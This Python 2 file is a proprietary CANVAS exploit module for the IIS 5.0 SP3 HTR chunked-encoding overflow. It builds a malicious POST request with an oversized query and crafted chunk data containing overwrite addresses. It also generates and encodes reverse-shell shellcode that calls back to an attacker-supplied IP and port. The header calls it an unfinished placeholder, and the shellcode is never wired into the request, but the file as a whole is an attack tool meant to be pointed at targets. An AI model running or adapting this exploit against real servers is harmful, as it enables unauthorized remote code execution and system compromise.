#! /usr/bin/env python


#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

#CANVAS HTR Exploit
#PLACEHOLDER - DOES NOT WORK YET


import os,getopt
import sys
import socket
from exploitutils import *
from encoder import addencoder
from shellcode import win32shell


class iis5htrexploit:
    def __init__(self):
        self.port=80
        self.host=""
        self.ssl=0
        self.shellcode=""
        self.attackfile="/bob.htr"
        return


    def setPort(self,port):
        self.port=port
        return

    def setHost(self,host):
        self.host=host
        return

    def setSSL(self,ssl):
        self.ssl=ssl
        return

    def setShellcode(self,shellcode):
        self.shellcode=shellcode
        return
    
    def run(self):
        #first make socket connection to target
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.host, self.port))

        sploitstring=self.makesploit()
        #here we handle SSL, not well, but we handle it
        if self.ssl:
            self.sslsock=socket.ssl(s)
            self.sslsock.write(sploitstring)
            result = self.sslsock.recv(1000)
            print "result=\n"+prettyprint(result)
            result = self.sslsock.recv(1000)
            print "result=\n"+prettyprint(result)

        else:
            s.send(sploitstring)
            result = s.recv(1000)
            print "result=\n"+(result)
            result = s.recv(1000)
            print "result=\n"+(result)


        print "Done."
        s.close()
        #success
        return 1 


    def getattackstrings(self):
        result=[]
        addr1=0x77edf6a1
        addr2=0x77edf44c
        
        #first line
        #result.append("A"*4+"X"*10+"\x8a\x00"+"\x00\x80"*3+intel_order(addr1)+intel_order(addr2)+"\xffffffff"*8)
        #line
        #result.append(intel_order(-1)*16)
        #line
        result.append("\xaa\xaa\xaa\xaa"+intel_order(-1)*15)
        result.append("\x00\x00\x00\x00"*16)
        result.append("XXXX"*16)
        result.append("X"*50000)
        return result
                
                      
    #returns the sploitstring
    def makesploit(self):
        header=""
        body=""

        header+="POST "+self.attackfile+"?"+"A"*600+" HTTP/1.1\r\n"
        header+="Host: "+self.host+"\r\n"
        header+="User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows NT;)\r\n"
        header+="Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,image/gif;q=0.2,text/css,*/*;q=0.1\r\n"
        header+="Connection: keep-alive\r\n"
        header+="Content-Type: application/x-www-form-urlencoded\r\n"
        header+="Transfer-Encoding: chunked\r\n\r\n"

        attackstrings=self.getattackstrings()
        
        for bodystring in attackstrings:
            body+="%8.8x\r\n" % len(bodystring)
            body+=bodystring+"\r\n"

        footer="0\r\n\r\n"

        return header+body+footer
        
def usage():
    print "Usage: iis5htr.py [-s]  -t target -p targetport -l localip -d localport "
    sys.exit(0)

#this stuff happens.
if __name__ == '__main__':

    print "Running CANVAS IIS 5.0 SP3 HTR exploit v 1.0"
    app = iis5htrexploit()

    try:
        (opts,args)=getopt.getopt(sys.argv[1:],"t:p:l:d:s")
    except getopt.GetoptError:
        #print help
        usage()

    i=0
    for o,a in opts:
        if o in ["-t"]:
            target=a
            i+=1
        if o in ["-p"]:
            targetport=a
            i+=1
        if o in ["-l"]:
            localhost=a
            i+=1
        if o in ["-d"]:
            localport=a
            i+=1
        if o in ["-s"]:
            app.setSSL(1)

    if i<4:
        #print "Only got %d args"%i
        usage()


    rawshellcode=win32shell.getshellcode(localhost,localport)
    #print "len rawshellcode = "+str(len(rawshellcode))
    #set up the shellcode
    encoder=addencoder.inteladdencoder()
    #figuring out these can be a pain.
    encoder.setbadstring("\x00\x6b\x2f\x20\x0a\x0d\xff\xe0")

    print "Encoding shellcode. This may take a while."
    shellcode=encoder.encode(rawshellcode)
    print "encoder reports following key: 0x%8.8x"%(encoder.getKey())
    print "Done encoding shellcode."
    if shellcode=="":
        print "Could not encode shellcode"
        sys.exit(0)
    #debug int
    #shellcode="\xcc"+shellcode        
    app.setShellcode(shellcode)
    app.setHost(target)
    app.setPort(int(targetport))

    app.run()
